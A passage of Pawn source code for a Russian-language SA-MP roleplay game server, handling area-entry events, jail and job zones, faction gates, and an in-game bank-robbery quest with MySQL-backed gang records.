		StopLowRide(ZoneBattle[i][bplayer1]);
	}
    if(areaid == armygunsp || (areaid >= armylichsp[0] && areaid <= armylichsp[4]))
	{
	    DeletePVar(playerid,"AmmoTimer");
	}
	if(areaid == spprog && PlayerInfo[playerid][pJail] == 1 && GetPVarInt(playerid,"Progulka") == 1)
	{
	    DeletePVar(playerid,"Progulka"), SpawnPlayer(playerid);
	}
	if(areaid == spadmtur && PlayerInfo[playerid][pJail] == 2) SpawnPlayer(playerid);
	if(areaid == sptur && PlayerInfo[playerid][pJail] == 1 && !GetPVarInt(playerid,"Progulka"))
	{
	    DeletePVar(playerid,"Progulka"), SpawnPlayer(playerid);
	}
	if(areaid == sprab && PlayerInfo[playerid][pJail] == 1 && !GetPVarInt(playerid,"Progulka"))
	{
        DeletePVar(playerid,"Shve");
        DeletePVar(playerid,"ShveW");
        DisablePlayerCheckpoint(playerid);
		SetPlayerSpecialAction(playerid,0);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		DeletePVar(playerid,"ShveC");
		if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
		SpawnPlayer(playerid);
	}
	if((areaid == checkmap[0] || areaid == checkmap[1]) && GetPVarInt(playerid,"ShowMap"))
	{
	    for(new i = 0; i <= 7; i++) TextDrawHideForPlayer(playerid,ShowMap[i]);
	    DeletePVar(playerid,"ShowMap");
	}
	if(areaid == RolikiSp && PlayerInfo[playerid][pRolik])
	{
		PlayerInfo[playerid][pRolik] = 0;
		SetSkin(playerid);
		SendClientMessage(playerid,-1,"Вы покинули зону парка! Ролики отданы обратно в прокат.");
 	}
//	if((areaid >= ZZZone[0] && areaid <= ZZZone[16]) || areaid == SpPes || areaid == SpGruz) DeletePVar(playerid,"ZZ");
	for(new i = 0; i < 100; i++)
	{
	    if(!AntiDM[i][admSP]) continue;
	    if(areaid != AntiDM[i][admSP]) continue;
	    DeletePVar(playerid,"ZZ");
	}
	if(areaid == SpPes && GetPVarInt(playerid,"Pes") > 0)
	{
		DeletePVar(playerid,"Pes");
		DeletePVar(playerid,"PesW");
		DisablePlayerCheckpoint(playerid);
		if(IsValidDynamicCP(GetPVarInt(playerid,"PesCheck"))) DestroyDynamicCP(GetPVarInt(playerid,"PesCheck")),DeletePVar(playerid,"PesCheck");
     	if(IsValidDynamicPickup(GetPVarInt(playerid,"PesPick"))) DestroyDynamicPickup(GetPVarInt(playerid,"PesPick")),DeletePVar(playerid,"PesPick");
		if(IsPlayerAttachedObjectSlotUsed(playerid, 1)) RemovePlayerAttachedObject(playerid, 1);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
		DeletePVar(playerid,"PesC");
		DeletePVar(playerid,"ZZ");
	}
	if(areaid == SpGruz &&GetPVarInt(playerid,"Gruz") > 0)
	{
		DeletePVar(playerid,"Gruz");
		DeletePVar(playerid,"GruzW");
		DisablePlayerCheckpoint(playerid);
		if(IsPlayerAttachedObjectSlotUsed(playerid, 5)) RemovePlayerAttachedObject(playerid, 5);
		DeletePVar(playerid,"GruzC");
		DeletePVar(playerid,"ZZ");
	}
	return 1;
}
forward HideThis(playerid);
public HideThis(playerid)
{
	if(GetPVarInt(playerid,"ShowInfo"))
	{
		DeletePVar(playerid,"ShowInfo");
		PlayerTextDrawDestroy(playerid,InfoText[playerid]);
		for(new gSL; gSL < 3; gSL++) TextDrawHideForPlayer(playerid, PressH[gSL]);
		PlayerInfo[playerid][pHideThis] = 0;
	}
	return 1;
}
function ShowBands(playerid,bands)
{
	new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
		new names_player[4][24];
		new num = 1,ids,names[24];
        for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "name", names, mysql);
		   	ids = cache_get_field_content_int(row-1, "id", mysql);
		    if(BankGrab[bands][bLeader] == ids) strmid(names_player[0],names,strlen(names),24);
		    else
		    {
		        strmid(names_player[num],names,strlen(names),24);
		        num++;
		    }
		}
		if(num < 4)
		{
		    for(new i = num; i < 4; i++) strmid(names_player[i],"-",strlen("-"),24);
		}
		format(query,sizeof(query),"1 | %s\t[Основатель]\n2 | %s\t[Подельник]\n3 | %s\t[Подельник]\n4 | %s\t[Подельник]",
		names_player[0],names_player[1],names_player[2],names_player[3]);
		ShowPlayerDialog(playerid,502,DIALOG_STYLE_TABLIST,"Основная линия",query,"Далее","Отмена");
	}
	return 1;

}
function ClearBands()
{
    new rows = cache_get_row_count(mysql);
    if(rows>0)
    {
        new names[24],ids;
        for(new row = 1; row<= rows; row++)
		{
		    cache_get_field_content(row-1, "name", names, mysql);
			ids = GetPlayerID(names);
			if(ids != INVALID_PLAYER_ID)
			{
			    PlayerInfo[ids][pGrabQuest] = 0;
			    PlayerInfo[ids][pGrabTeam] = 0;
                BankGrab[ids][bLeader] = -1;
				for(new x = 0; x < 5; x++) BankGrab[ids][bQuest][x] = 0;
				BankGrab[ids][bTimes] = 0;
				BankGrab[ids][bTown] = 0;
				BankGrab[ids][bVeh] = 0;
				BankGrab[ids][bPlayer][0] = 0;
				BankGrab[ids][bPlayer][1] = 0;
				BankGrab[ids][bPlayer][2] = 0;
			}
			else
			{
	   			query = "";
				format(query,sizeof(query),"UPDATE `accounts` SET `pGrabQuest` = '0',`pGrabTeam` = '0',`bLeader` = '0'\
				,`bPlayer0` = '0',`bPlayer1` = '0',`bPlayer2` = '0' \
				,`bQuest0` = '0',`bQuest1` = '0',`bQuest2` = '0',`bQuest3` = '0',`bQuest4` = '0'\
				,`bTown` = '0',`bTimes` = '0' WHERE names = '%s' LIMIT 1",names);
				mysql_tquery(mysql,query);
			}
		}
	}
	return 1;
}

/*function ClearBandsLeader()
{
    if(cache_get_row_count(mysql)>0)
    {
        new names[24],ids;
        cache_get_field_content(0, "name", names, mysql);
        ids = GetPlayerID(names);
		if(ids != INVALID_PLAYER_ID)
		{
		    PlayerInfo[ids][pGrabQuest] = 0;
		    PlayerInfo[ids][pGrabTeam] = 0;
		}
		else
		{
		    query = "";
			format(query,sizeof(query),"UPDATE `accounts` SET `pGrabQuest` = '0',`pGrabTeam` = '0',`bLeader` = '0'\
			,`bPlayer0` = '0',`bPlayer1` = '0',`bPlayer2` = '0',`bPlayer3` = '0' \
			,`bQuest0` = '0',`bQuest1` = '0',`bQuest2` = '0',`bQuest3` = '0',`bQuest4` = '0'\
			,`bTown` = '0',`bTimes` = '0' WHERE names = '%s' LIMIT 1",names);
			mysql_tquery(mysql,query);
		}
    }
    return 1;
}*/
stock ClearBand(i)
{
	for(new x = 0; x < 3; x++)
	{
		query = "";
		format(query, sizeof(query), "SELECT * FROM accounts WHERE id = '%d'", BankGrab[i][bPlayer][x]);
		mysql_tquery(mysql, query, "ClearBands");
		BankGrab[i][bPlayer][x] = -1;
	}
	query = "";
	format(query, sizeof(query), "SELECT * FROM accounts WHERE id = '%d'", BankGrab[i][bLeader]);
	mysql_tquery(mysql, query, "ClearBands");
	
	return 1;
}
stock SendBandMes(band,color,text[])
{
    for(new i = 0; i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || PlayerInfo[i][pGrabTeam] != band) continue;
	    SendClientMessage(i,color,text);
	}
	return 1;
}
stock ClearBank(band,bank)
{
	new map_int = 66, map_world = bank+1;
	BankHack[bank][bYaStatus][0] = 0;
	BankHack[bank][bYaStatus][1] = 0;
	BankHack[bank][bYaStatus][2] = 0;
	BankHack[bank][bYaStatus][3] = 0;
	BankHack[bank][bYaStatus][4] = 0;
	BankHack[bank][bYaStatus][5] = 0;
	BankHack[bank][bankStaff] = 0;
	BankHack[bank][bGrab] = 0;
    if(BankGrab[band][bGrabStatus] >= 3) MoveDynamicObject(BankHack[bank][bankDoor][0],1374.373901, -18.635730-0.1, 1003.401123,0.12,0.0,0.0,0.0);
    if(BankGrab[band][bGrabStatus] >= 4)
    {
	    MoveDynamicObject(BankHack[bank][bankDoor][1],1376.654174, -9.294741-0.1, 1003.401123, 0.12,0.000000, -0.000007, 179.999954);
	    MoveDynamicObject(BankHack[bank][bankDoor][2],1373.653442, -9.325742-0.1, 1003.401123,0.12, 0.000000, 0.000007, 0.000000);
    }
	if(BankGrab[band][bGrabStatus] >= 5)
	{
	    BankHack[bank][bankDoor][3] = CreateDynamicObject(1495, 1385.467529, 0.895255, 999.899291, 0.000000, -0.000053, 179.999679, map_world, map_int, -1, 300.00, 300.00);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][3], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][3], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][3], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
		BankHack[bank][bankDoor][4] = CreateDynamicObject(1495, 1382.466796, 0.864254, 999.899291, 0.000000, 0.000053, 0.000000, map_world, map_int, -1, 300.00, 300.00);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][4], 0, 1560, "7_11_door", "CJ_CHROME2", 0xFFFFFFFF);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][4], 1, 10806, "airfence_sfse", "ws_griddyfence", 0x00000000);
		SetDynamicObjectMaterial(BankHack[bank][bankDoor][4], 2, 1560, "7_11_door", "CJ_CHROME2", 0xFFD3D3D3);
		for(new i = 0; i < 6; i++)
		{
		    if(BankHack[bank][bYaStatus][i]) continue;
		    BankHack[bank][bYaStatus][i] = 0;
		    UpdateYach(bank,i);
		}
	}
	return 1;
}
function HackStaff(playerid)
{
	SetTimerEx("ClearAnim", 300, 0, "d", playerid);
	TogglePlayerControllable(playerid, 1);
	BankHack[BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]][bankStaff] = 0;
	SendBandMes(PlayerInfo[playerid][pGrabTeam],CREWARD,"Взломайте систему сингализации и дверей!");
	SendBandMes(PlayerInfo[playerid][pGrabTeam],-1,"Для взлома используйте: {f7ae11}LALT");
//GetPVarInt(playerid,"GrabQuest",3);
    
	new i = BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown];
	BankGrab[PlayerInfo[playerid][pGrabTeam]][bGrabStatus] = 3;
	MoveDynamicObject(BankHack[i][bankDoor][0],1374.373901, -18.635730+0.1, 1003.401123,0.12,0.0,0.0,90.0);
	return 1;
}

function PlantBomb(playerid)
{
    new i = PlayerInfo[playerid][pGrabTeam];
    new map_int = 66, map_world = BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown]+1;
    CreateDynamicObject(1654, 1383.95, 0.80, 1000.13, 0.00, 0.00, 0.00, map_world, map_int);
    SetTimerEx("ClearAnim", 300, 0, "d", playerid);
    SendBandMes(i,CREWARD,"Бомба установлена! Отойдите на безопастное расстояние!");
    TogglePlayerControllable(playerid, 1);
    BankGrab[i][bTickBomb] = 10;
	return 1;
}


stock UpdateYach(gorod,d)
{
	new str[60];
	format(str,sizeof(str),"{f7ae11}[Ячейка]{ffffff}\nСтатус: {f7ae11}[%s]{ffffff}\nДля взлома используйте: {f7ae11}LALT",
 	(BankHack[gorod][bYaStatus][d] == 2) ? ("Открыта") : ("Закрыта"));
    UpdateDynamic3DTextLabelText(YachText[gorod][d],-1,str);
}
public OnPlayerEnterDynamicArea(playerid, areaid)
{
	for(new i = 1; i < TOTALGZ; i++)
	{
		if(areaid != GZInfo[i][gSp] || !GZInfo[i][gCapture]) continue;
		if(PlayerInfo[playerid][pMember] != GZInfo[i][gFrak] && PlayerInfo[playerid][pMember] != GZInfo[i][gNapad])
		{
			ApplyAnimation(playerid,"PED","getup_front",4.0,0,0,1,0,0);
			ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"Запрещено!","{ffffff}Предупреждение! Запрещенно достовать оружия на территории,где идет война!","Далее","");
			SetPlayerArmedWeapon(playerid, 0);
		}
		break;
	}
	new band = PlayerInfo[playerid][pGrabTeam];
	
	if(areaid == bankkasls)
	{
	    if(GetPVarInt(playerid,"GrabTown") != 1) return 1;
		SendClientMessage(playerid,CREWARD,"Вы договорились о помощи в ограблении!");
		SendClientMessage(playerid,-1,"Соберите команду и выполните задание при помощи: {f7ae11}/robbery");
		PlayerInfo[playerid][pGrabTeam] = PlayerInfo[playerid][pID];
	 	band = PlayerInfo[playerid][pGrabTeam];
		BankGrab[band][bTown] = 0;
		BankGrab[band][bQuest][0] = 2;
	}
	if(areaid == bankkaslv)
	{
	    if(GetPVarInt(playerid,"GrabTown") != 2) return 1;
		SendClientMessage(playerid,CREWARD,"Вы договорились о помощи в ограблении!");
		SendClientMessage(playerid,-1,"Соберите команду и выполните задание при помощи: {f7ae11}/robbery");
		BankGrab[PlayerInfo[playerid][pGrabTeam]][bTown] = 1;
	}
    if(areaid == poscarls)
    {
        //new band = PlayerInfo[playerid][pGrabTeam];
		if(!band) return true;
		if(BankGrab[band][bTown]) return 1;
        if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 1)
        {
			SendBandMes(band,CREWARD,"Войдите в банк и взломайте комнату охраны!");
			SendBandMes(band,-1,"Комната находится на 2 этаже, для взлома используйте: {f7ae11}LALT");
			BankGrab[band][bGrabStatus] = 2;
        }
    }
    if(areaid == poscarlv)
    {
        //new band = PlayerInfo[playerid][pGrabTeam];
		if(!band) return true;
		if(!BankGrab[band][bTown]) return 1;
        if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 1)
        {
			SendBandMes(band,CREWARD,"Войдите в банк и взломайте комнату охраны!");
			SendBandMes(band,-1,"Комната находится на 2 этаже, для взлома используйте: {f7ae11}LALT");
			BankGrab[band][bGrabStatus] = 2;
        }
    }

    if(areaid == setbomb)
    {
        //new band = PlayerInfo[playerid][pGrabTeam];
		if(!band) return true;
        if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 4 && !BankGrab[band][bBombStatus])
        {
            BankGrab[band][bBombStatus] = 1;
			//ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
			//anim plant
            GameTextForPlayer(playerid, "~G~WAIT 5 SECONDS....", 5000, 1);
            TogglePlayerControllable(playerid, 0);
            SetTimerEx("PlantBomb",5000,false,"d",playerid);
		}
    }
    if(areaid == cinghack)
    {
        //new band = PlayerInfo[playerid][pGrabTeam];
		if(!band) return true;
        if(BankGrab[band][bGrab] && BankGrab[band][bGrabStatus] == 3)
        {
			SetPVarInt(playerid,"Vzlom",17);
			ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
			StartGame(playerid);
		}
    }
  
	
	
	new picka;
	if(areaid == lsbankphoto[0])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 1 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLS[0][3],PhotoPosLS[0][4],PhotoPosLS[0][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте главный вход в банк!");
	    SetPVarInt(playerid,"GrabQuestW",1);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == lsbankphoto[1])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 2 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLS[1][3],PhotoPosLS[1][4],PhotoPosLS[1][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте систему вентиляции банка!");
	    SetPVarInt(playerid,"GrabQuestW",2);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == lsbankphoto[2])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 3 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLS[2][3],PhotoPosLS[2][4],PhotoPosLS[2][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте запасный выход банка!");
	    SetPVarInt(playerid,"GrabQuestW",3);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == lvbankphoto[0])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 1 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLV[0][3],PhotoPosLV[0][4],PhotoPosLV[0][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте главный вход в банк!");
	    SetPVarInt(playerid,"GrabQuestW",1);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == lvbankphoto[1])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 2 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLV[1][3],PhotoPosLV[1][4],PhotoPosLV[1][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте систему вентиляции банка!");
	    SetPVarInt(playerid,"GrabQuestW",2);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == lvbankphoto[2])
	{
	    if(GetPVarInt(playerid,"GrabQuestW") != 3 || GetPVarInt(playerid,"GrabQuest") != 2) return 1;
	    picka = CreateDynamicPickup(19135, 23, PhotoPosLV[2][3],PhotoPosLV[2][4],PhotoPosLV[2][5], 0, 0, playerid, 100.0);
	    SendClientMessage(playerid,CREWARD,"Сфотографируйте запасный выход банка!");
	    SetPVarInt(playerid,"GrabQuestW",3);
	    SetPVarInt(playerid,"GrabQuestP",picka);
	}
	if(areaid == armygrab)
	{
	    if(GetPVarInt(playerid,"GrabQuest") == 1 && !GetPVarInt(playerid,"GrabQuestW") && !GetPVarInt(playerid,"Vzlom"))
	    {
	        ApplyAnimation(playerid, "OTB", "BETSLP_LOOP",4.0,1,0,0,0,0,1);
            SetPVarInt(playerid,"Vzlom",15);
            StartGame(playerid);
	    }
	}
	if(areaid == util)
	{
	    if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return 1;
	    new i = PlayerInfo[playerid][pGrabTeam];
	    new veh = GetPlayerVehicleID(playerid);
		if(veh == BankGrab[i][bVeh])
		{
		    //if(GetBandInVeh(i,veh) < 4) return SendClientMessage(playerid,CGREY,"В транспорте должны быть все члены банды!");
			BInfo[veh][bMoney] -= BInfo[veh][bMoney]*10/100;
			GiveMoney(BankGrab[i][bLeader], BInfo[veh][bMoney]/4);
			GiveMoney(BankGrab[i][bPlayer][0], BInfo[veh][bMoney]/4);
			GiveMoney(BankGrab[i][bPlayer][1], BInfo[veh][bMoney]/4);
			GiveMoney(BankGrab[i][bPlayer][2], BInfo[veh][bMoney]/4);
			SetVehicleToRespawn(veh);
			SendClientMessage(BankGrab[i][bLeader],CREWARD,"Вы успешно ограбили банк!");
			SendClientMessage(BankGrab[i][bPlayer][0],CREWARD,"Вы успешно ограбили банк!");
			SendClientMessage(BankGrab[i][bPlayer][1],CREWARD,"Вы успешно ограбили банк!");
			SendClientMessage(BankGrab[i][bPlayer][2],CREWARD,"Вы успешно ограбили банк!");
			ClearBank(i,BankGrab[i][bTown]);
		    ClearBand(i);
		    
		}
	}
	
	if(areaid == armygunsp)
	{
 		if(FracMats[F_ARMY] < 250) return SendClientMessage(playerid,CGREY,"На складе недостаточно метриалов");
	}
	for(new idx = 0; idx <= TOTALACTOS; idx++)
	{
		if(!ActorsInfo[idx][atext1] || areaid != ActorsInfo[idx][azona]) continue;
        SayQBot(idx);
		
		break;
	}
	
//	if((areaid >= ZZZone[0] &&  areaid <= ZZZone[16]) || areaid == SpGruz || areaid == SpPes) SetPVarInt(playerid,"ZZ",1),SetPlayerArmedWeapon(playerid,0);
	for(new i = 0; i < 100; i++)
	{
	    if(!AntiDM[i][admSP]) continue;
	    if(areaid != AntiDM[i][admSP]) continue;
	    SetPVarInt(playerid,"ZZ",1),SetPlayerArmedWeapon(playerid,0);
	    break;
	}
	if((PlayerInfo[playerid][pMember] == F_LSPD && GetPlayerVirtualWorld(playerid) == 17) ||  (GetPlayerVirtualWorld(playerid) == 1 && PlayerInfo[playerid][pMember] == F_LVPD))
	{
	    for(new i = 0; i < 16; i++)
	    {
	        if(areaid != doorsp[i]) continue;
	        GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
	        break;
	    }
    }
	if(!IsPlayerInAnyVehicle(playerid))
	{
		if((areaid >= areagsp[0] &&  areaid <= areagsp[3]) && (PlayerInfo[playerid][pMember] == F_ARMY || PlayerInfo[playerid][pMember] == F_MAYOR)) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if((PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_LSPD || PlayerInfo[playerid][pMember] == F_FBI) && !IsPlayerInAnyVehicle(playerid))
		{
			if(areaid == arenagate[0] ||areaid == arenagate[1]) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
			else
			{
			    for(new i = 0; i<=5; i++)
			    {
					if(areaid != shlagsp[i]) continue;
					GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
					break;
			    }
			}
		}
    }
    else
    {
		if((areaid == lvpdsp || areaid == fcpdsp[0] || areaid == fcpdsp[1]) && (PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_MAYOR)) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if((areaid == lspdsp[0] || areaid == lspdsp[1]) && (PlayerInfo[playerid][pMember] == F_LSPD || PlayerInfo[playerid][pMember] == F_MAYOR)) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if(PlayerInfo[playerid][pMember] == F_NEWS && areaid == newssp) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if(PlayerInfo[playerid][pMember] == F_HOSPITAL_LS && areaid == hossp) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if((PlayerInfo[playerid][pMember] == F_FBI || PlayerInfo[playerid][pMember] == F_MAYOR) && areaid == fbisp) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);

		if((PlayerInfo[playerid][pMember] == F_LSPD || PlayerInfo[playerid][pMember] == F_MAYOR) && (areaid == lspdspveh[0] || areaid == lspdspveh[1])) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);

		if((PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_LSPD
		|| PlayerInfo[playerid][pMember] == F_FBI) && (areaid == turmagatesp[0] || areaid == turmagatesp[1])) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);

		if((PlayerInfo[playerid][pMember] == F_MAYOR || PlayerInfo[playerid][pMember] == F_ARMY) && (areaid == areagatesp[0] || areaid == areagatesp[1])) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
		if((PlayerInfo[playerid][pMember] == F_LVPD || PlayerInfo[playerid][pMember] == F_MAYOR) && areaid == lvpdspveh) GameTextForPlayer(playerid,"PRESS ~r~H",3000,5);
	
	}
	
	if(areaid == npcsp && IsPlayerNPC(playerid) && playerid == npcid)
	{
	    if(mat == 1)
	    {
			sam[0] = CreateDynamic3DTextLabel("Материалов {f7ae11}20000/20000{FFFFFF}\nВзять: {f7ae11}LALT",-1,611.4603,1287.3488,12.7891,15, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, -1, -1);
			sam[1] = CreateDynamic3DTextLabel("Материалов {f7ae11}20000/20000{FFFFFF}\nВзять: {f7ae11}LALT",-1,629.4431,1298.4855,12.7891,15, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, 0, -1, -1);
			samolet[0] = 20000;
			samolet[1] = 20000;
			objectsam[0] = CreateDynamicObjectEx(3066, 611.63324, 1287.37415, 11.73130,   0.00000, 0.00000, 120.00000,300.0,300.0);
			objectsam[1] = CreateDynamicObjectEx(3066, 629.19794, 1297.57568, 11.73130,   0.00000, 0.00000, 120.00000,300.0,300.0);
			mat = 2;
		}
	}
	new panels1, doors1, lights1, tires1;
	for(new i = 0; i < MAX_PLAYERS; i++)
 	{
		if(!IsPlayerConnected(i) || PlayerLogged[i] == false || areaid != PlayerInfo[i][pObjectSp]) continue;
		GetVehicleDamageStatus(GetPlayerVehicleID(playerid), panels1, doors1, lights1, tires1);
		UpdateVehicleDamageStatus(GetPlayerVehicleID(playerid), panels1, doors1, lights1, 15);
		break;
	}
	return 1;
}
stock GetBandInVeh(band,veh)
{
	new num;
	for(new i= 0;i < MAX_PLAYERS; i++)
	{
	    if(!IsPlayerConnected(i) || PlayerLogged[i] == false || !IsPlayerInAnyVehicle(i)) continue;
	    if(GetPlayerVehicleID(i) != veh) continue;
		if(PlayerInfo[i][pID] == BankGrab[band][bPlayer][0]) num++;
		if(PlayerInfo[i][pID] == BankGrab[band][bPlayer][1]) num++;
		if(PlayerInfo[i][pID] == BankGrab[band][bPlayer][2]) num++;
		if(PlayerInfo[i][pID] == BankGrab[band][bLeader]) num++;
	}
	return num;
}
forward DestroyTrain();
public DestroyTrain()
{
	Kick(npcid);
	DestroyVehicle(vehnpc);
    npcid = INVALID_PLAYER_ID;
}
stock GetSamol(playerid)
{
	if(IsPlayerInRangeOfPoint(playerid, 3.0, 611.4603,1287.3488,11.7891))	return 0;
	else if(IsPlayerInRangeOfPoint(playerid, 3.0, 629.4431,1298.4855,11.7891)) return 1;
	return 0;
}
stock SetKaska(playerid)
{

	if(GetPlayerSkin(playerid) == 1|| GetPlayerSkin(playerid) == 3|| GetPlayerSkin(playerid) == 4|| GetPlayerSkin(playerid) == 5|| GetPlayerSkin(playerid) == 7|| GetPlayerSkin(playerid) == 9
	|| GetPlayerSkin(playerid) == 10|| GetPlayerSkin(playerid) == 11|| GetPlayerSkin(playerid) == 12|| GetPlayerSkin(playerid) == 14|| GetPlayerSkin(playerid) == 15|| GetPlayerSkin(playerid) == 17
	|| GetPlayerSkin(playerid) == 18|| GetPlayerSkin(playerid) == 20|| GetPlayerSkin(playerid) == 21|| GetPlayerSkin(playerid) == 25|| GetPlayerSkin(playerid) == 26|| GetPlayerSkin(playerid) == 28
	|| GetPlayerSkin(playerid) == 30|| GetPlayerSkin(playerid) == 39|| GetPlayerSkin(playerid) == 40|| GetPlayerSkin(playerid) == 43|| GetPlayerSkin(playerid) == 44
	|| GetPlayerSkin(playerid) == 45|| GetPlayerSkin(playerid) == 46|| GetPlayerSkin(playerid) == 47|| GetPlayerSkin(playerid) == 48|| GetPlayerSkin(playerid) == 49|| GetPlayerSkin(playerid) == 50
	|| GetPlayerSkin(playerid) == 55|| GetPlayerSkin(playerid) == 56|| GetPlayerSkin(playerid) == 57|| GetPlayerSkin(playerid) == 58|| GetPlayerSkin(playerid) == 59|| GetPlayerSkin(playerid) == 60|| GetPlayerSkin(playerid) == 66
	|| GetPlayerSkin(playerid) == 67|| GetPlayerSkin(playerid) == 68|| GetPlayerSkin(playerid) == 69|| GetPlayerSkin(playerid) == 70|| GetPlayerSkin(playerid) == 72|| GetPlayerSkin(playerid) == 73|| GetPlayerSkin(playerid) == 76
	|| GetPlayerSkin(playerid) == 78|| GetPlayerSkin(playerid) == 79|| GetPlayerSkin(playerid) == 86|| GetPlayerSkin(playerid) == 90|| GetPlayerSkin(playerid) == 91|| GetPlayerSkin(playerid) == 95|| GetPlayerSkin(playerid) == 96
	|| GetPlayerSkin(playerid) == 97|| GetPlayerSkin(playerid) == 98|| GetPlayerSkin(playerid) == 100|| GetPlayerSkin(playerid) == 101|| GetPlayerSkin(playerid) == 102|| GetPlayerSkin(playerid) == 106|| GetPlayerSkin(playerid) == 111|| GetPlayerSkin(playerid) == 112
	|| GetPlayerSkin(playerid) == 113|| GetPlayerSkin(playerid) == 117|| GetPlayerSkin(playerid) == 118|| GetPlayerSkin(playerid) == 119|| GetPlayerSkin(playerid) == 120|| GetPlayerSkin(playerid) == 121
	|| GetPlayerSkin(playerid) == 122|| GetPlayerSkin(playerid) == 123|| GetPlayerSkin(playerid) == 124|| GetPlayerSkin(playerid) == 125|| GetPlayerSkin(playerid) == 126|| GetPlayerSkin(playerid) == 127|| GetPlayerSkin(playerid) == 128
	|| GetPlayerSkin(playerid) == 147|| GetPlayerSkin(playerid) == 148|| GetPlayerSkin(playerid) == 154|| GetPlayerSkin(playerid) == 156|| GetPlayerSkin(playerid) == 160|| GetPlayerSkin(playerid) == 162
	|| GetPlayerSkin(playerid) == 163|| GetPlayerSkin(playerid) == 164|| GetPlayerSkin(playerid) == 165|| GetPlayerSkin(playerid) == 166|| GetPlayerSkin(playerid) == 169|| GetPlayerSkin(playerid) == 170
	|| GetPlayerSkin(playerid) == 171|| GetPlayerSkin(playerid) == 176|| GetPlayerSkin(playerid) == 179|| GetPlayerSkin(playerid) == 180|| GetPlayerSkin(playerid) == 182|| GetPlayerSkin(playerid) == 183
	|| GetPlayerSkin(playerid) == 184|| GetPlayerSkin(playerid) == 185|| GetPlayerSkin(playerid) == 186|| GetPlayerSkin(playerid) == 187|| GetPlayerSkin(playerid) == 188|| GetPlayerSkin(playerid) == 189
	|| GetPlayerSkin(playerid) == 191|| GetPlayerSkin(playerid) == 192|| GetPlayerSkin(playerid) == 193|| GetPlayerSkin(playerid) == 200|| GetPlayerSkin(playerid) == 206|| GetPlayerSkin(playerid) == 208|| GetPlayerSkin(playerid) == 210|| GetPlayerSkin(playerid) == 213
